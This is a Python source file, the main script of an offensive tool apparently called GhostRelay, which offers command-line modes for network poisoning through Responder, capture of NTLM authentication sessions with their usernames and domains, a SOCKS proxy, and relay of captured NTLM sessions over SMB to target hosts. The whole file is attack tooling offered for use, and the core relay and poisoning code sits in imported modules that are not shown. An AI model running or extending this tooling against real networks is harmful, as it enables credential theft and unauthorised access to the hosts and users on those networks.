# ghostrelay.py

from __future__ import annotations
import argparse
import logging
import sys
import signal
import time

from config import CONFIG
from socks_proxy import GhostRelaySocksServer
from sessions import SESSION_STORE, NTLMSession
from responder_manager import ResponderManager
from relay_smb import list_relayable_targets, relay_ntlm_to_target, SMBRelayTarget


responder = ResponderManager()


def setup_logger(cfg):
    logger = logging.getLogger("ghostrelay")
    logger.setLevel(logging.DEBUG)

    fmt = logging.Formatter("[%(asctime)s] %(levelname)s: %(message)s")

    sh = logging.StreamHandler(sys.stdout)
    sh.setLevel(logging.INFO)
    sh.setFormatter(fmt)
    logger.addHandler(sh)

    if cfg.log_file:
        fh = logging.FileHandler(cfg.log_file)
        fh.setLevel(logging.DEBUG)
        fh.setFormatter(fmt)
        logger.addHandler(fh)

    return logger


def parse_args():
    parser = argparse.ArgumentParser(
        description="GhostRelay – NTLM-aware SOCKS Proxy + Responder Integration"
    )

    parser.add_argument("--listen", "-l", default=CONFIG.listen_host)
    parser.add_argument("--port", "-p", type=int, default=CONFIG.listen_port)

    parser.add_argument("--list-sessions", action="store_true")
    parser.add_argument("--details", type=int)
    parser.add_argument("--clear-sessions", action="store_true")

    parser.add_argument("--relay-smb", action="store_true",
                        help="Use captured NTLM sessions to attempt SMB relay.")
    parser.add_argument("--targets", nargs="+",
                        help="Targets for SMB relay, e.g. --targets 192.168.1.x")
    parser.add_argument("--session-id", type=int,
                        help="Session ID to relay.")

    # NEW MODES:
    parser.add_argument("--capture", action="store_true")
    parser.add_argument("--relay", action="store_true")
    parser.add_argument("--stop-responder", action="store_true")

    # SOCKS-only
    parser.add_argument("--proxy", action="store_true")

    parser.add_argument("--auto", action="store_true")

    return parser.parse_args()


def _format_age(ts: float) -> str:
    delta = time.time() - ts
    if delta < 60: return f"{int(delta)}s"
    if delta < 3600: return f"{int(delta // 60)}m"
    return f"{int(delta // 3600)}h"


def cmd_list_sessions():
    sessions = SESSION_STORE.list_sessions()
    if not sessions:
        print("GhostRelay: No NTLM sessions captured.")
        return

    for s in sessions:
        mt = s.message_type_name or "UNKNOWN"
        age = _format_age(s.created_at)
        print(
            f"ID={s.id} [{mt}] age={age} src={s.source_ip} -> {s.dest_ip} "
            f"dir={s.direction} size={len(s.raw_data)}"
        )


def cmd_show_details(sid: int):
    s = SESSION_STORE.get_session(sid)
    if not s:
        print(f"GhostRelay: No session ID {sid}.")
        return

    print(f"Session ID       : {s.id}")
    print(f"Created          : {time.ctime(s.created_at)} ({_format_age(s.created_at)} ago)")
    print(f"Source IP        : {s.source_ip}")
    print(f"Destination IP   : {s.dest_ip}")
    print(f"Direction        : {s.direction}")
    print(f"Note             : {s.note}")
    print(f"Raw size         : {len(s.raw_data)} bytes")
    print()
    print("NTLM Metadata")
    print("-------------")
    print(f"Message type     : {s.message_type} ({s.message_type_name})")
    print(f"Username         : {s.username}")
    print(f"Domain           : {s.domain}")
    print(f"Workstation      : {s.workstation}")


def handle_exit(signum, frame):
    print("\n[GhostRelay] Caught exit signal, stopping services...")

    if responder.running:
        responder.stop_responder()

    print("[GhostRelay] Exiting cleanly.")
    sys.exit(0)


signal.signal(signal.SIGINT, handle_exit)
signal.signal(signal.SIGTERM, handle_exit)


def main():
    args = parse_args()

    # -------------------------
    # Basic session operations
    # -------------------------

    if args.clear_sessions:
        SESSION_STORE.clear()
        print("GhostRelay: All sessions cleared.")
        return

    if args.list_sessions:
        cmd_list_sessions()
        return

    if args.details is not None:
        cmd_show_details(args.details)
        return

    if args.stop_responder:
        responder.stop_responder()
        return

    # -------------------------
    # SMB RELAY (this must be BEFORE the no-mode return)
    # -------------------------
    if args.relay_smb:
        if not args.targets:
            print("[GhostRelay][SMB] No targets supplied. Use --targets <ip1> <ip2> ...")
            return

        relayable = list_relayable_targets(args.targets)

        if not relayable:
            print("[GhostRelay][SMB] No relayable targets found.")
            return

        if args.session_id is None:
            print("[GhostRelay][SMB] Use --session-id <id> with a captured NTLM session.")
            return

        target = relayable[0]
        print(f"[GhostRelay][SMB] Using target {target.host}:{target.port} for relay.")
        relay_ntlm_to_target(args.session_id, target)
        return

    # -------------------------
    # Responder modes
    # -------------------------
    if args.capture:
        responder.start_capture_mode()
        print("[GhostRelay] Responder running. Press CTRL+C to stop.")
        while True: time.sleep(1)

    if args.relay:
        responder.start_relay_mode()
        logger = setup_logger(CONFIG)
        srv = GhostRelaySocksServer(args.listen, args.port, logger)
        print("[GhostRelay] Relay mode active. Poisoning + SOCKS rewriting.")
        srv.start()
        return

    if args.proxy:
        logger = setup_logger(CONFIG)
        srv = GhostRelaySocksServer(args.listen, args.port, logger)
        srv.start()
        return

    if args.auto:
        print("[GhostRelay] Auto mode not implemented yet.")
        return

    # -------------------------
    # Default fallback
    # -------------------------
    print("GhostRelay: No mode selected. Use:")
    print("  --capture")
    print("  --relay")
    print("  --proxy")
    print("  --relay-smb")
    print("  --list-sessions")
    print("  --details <id>")
    print("  --stop-responder")


if __name__ == "__main__":
    main()

